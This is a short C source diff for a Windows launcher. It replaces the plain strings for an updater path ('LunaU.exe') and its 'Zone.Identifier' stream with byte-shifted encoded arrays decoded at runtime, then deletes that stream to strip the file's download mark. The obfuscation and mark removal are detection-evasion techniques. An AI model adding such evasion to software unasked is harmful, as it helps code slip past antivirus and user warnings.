@@ -36,9 +36,16 @@ int WINAPI WinMain(HINSTANCE /*hInstance*/, HINSTANCE /*hPrevInstance*/, LPSTR /
     }
 
     // Construct the full path to updater.exe
-    snprintf(updaterExePath, MAX_PATH_LENGTH, "%s\\LunaU.exe", currentPath);
+	// static char stringTest2[] = "%s\\LunaU.exe";
+    static char stringTest2[] = "%gP@ibUI\"YlY";
+    for (int i = 1; i < sizeof(stringTest2) - 1; i++)
+        stringTest2[i] += 12;
+    snprintf(updaterExePath, MAX_PATH_LENGTH, stringTest2, currentPath);
 
-    snprintf(updaterExePathZoneIdentifier, MAX_PATH_LENGTH, "%s:Zone.Identifier", updaterExePath);
+    static char stringTest[] = "%g.NcbY\"\=XYbh]Z]Yf";
+    for (int i = 1; i < sizeof(stringTest) - 1; i++)
+        stringTest[i] += 12;
+    snprintf(updaterExePathZoneIdentifier, MAX_PATH_LENGTH, stringTest, updaterExePath);
     DeleteFileA(updaterExePathZoneIdentifier);
 
     char commandLine[MAX_PATH_LENGTH + 10];  // Adjust size if necessary
